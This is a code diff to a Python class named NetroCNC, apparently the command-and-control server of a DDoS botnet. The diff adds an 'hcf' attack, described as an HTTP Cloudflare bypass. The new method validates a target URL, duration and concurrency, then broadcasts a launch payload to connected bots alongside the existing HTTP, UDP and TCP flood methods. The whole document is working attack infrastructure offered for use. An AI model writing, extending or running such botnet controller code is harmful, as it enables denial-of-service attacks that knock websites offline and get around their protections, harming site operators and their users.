@@ -183,7 +183,7 @@ class NetroCNC(object):
         if len(args) < 1:
             return "Missing command arguments. Type \"help\" to show the launch command manual."
         
-        attack_methods = ["http", "udp", "tcp"]
+        attack_methods = ["http", "hcf", "udp", "tcp"]
         attack_method = args[0].lower()
 
         if not attack_method in attack_methods:
@@ -194,6 +194,8 @@ class NetroCNC(object):
         match attack_method:
             case "http":
                 return self.attack_method_http(args=args)
+            case "hcf":
+                return self.attack_method_hcf(args=args)
             case "tcp":
                 return self.attack_method_tcp(args=args)
             case "udp":
@@ -211,6 +213,7 @@ class NetroCNC(object):
 
             if not parsed.scheme in ["http", "https"]:
                 raise Exception
+            
         except Exception:
             return f"Error: Missing or invalid HTTP attack URL.\nUsage: {usage}"
         
@@ -249,6 +252,58 @@ class NetroCNC(object):
         self.store_attack(attack_payload=attack_command["attack_payload"])
 
         return f"Initialized HTTP attack on {url}\nAttack ID: {attack_id}\nTotal Bots: {total_bots}\nDuration: {duration}\nConcurrency: {concurrency}"
+
+    def attack_method_hcf(self, args: list):
+        usage = "launch hcf [URL] [DURATION] [CONCURRENCY]"
+        
+        try:
+            url = args[0]
+
+            parsed = urlparse(url)
+
+            socket.gethostbyname(parsed.hostname)
+
+            if not parsed.scheme in ["http", "https"]:
+                raise Exception
+            
+        except Exception:
+            return f"Error: Missing or invalid HTTP attack URL.\nUsage: {usage}"
+        
+        try:
+            duration = int(args[1])
+
+            if duration < 10:
+                raise Exception
+        except Exception:
+            return f"Error: Missing or invalid HTTP attack duration.\nUsage: {usage}"
+        
+        try:
+            concurrency = int(args[2])
+
+            if concurrency < 1:
+                raise Exception
+        except Exception:
+            return f"Error: Missing or invalid HTTP attack concurrency.\nUsage: {usage}"
+        
+        attack_id = self.generate_attack_id()
+        attack_timeout = time.time() + duration
+
+        attack_command = {
+            "op": "COMMAND",
+            "command": "launch",
+            "attack_payload": {
+                "id": attack_id,
+                "method": "hcf",
+                "target": url,
+                "timeout": attack_timeout,
+                "concurrency": concurrency
+            }
+        }
+
+        total_bots = self.broadcast_message(message=attack_command)
+        self.store_attack(attack_payload=attack_command["attack_payload"])
+
+        return f"Initialized HTTP-Cloudflare-Bypass attack on {url}\nAttack ID: {attack_id}\nTotal Bots: {total_bots}\nDuration: {duration}\nConcurrency: {concurrency}"
 
     def attack_method_tcp(self, args: list):
         usage = "launch tcp [IP:PORT] [DURATION] [CONCURRENCY]"
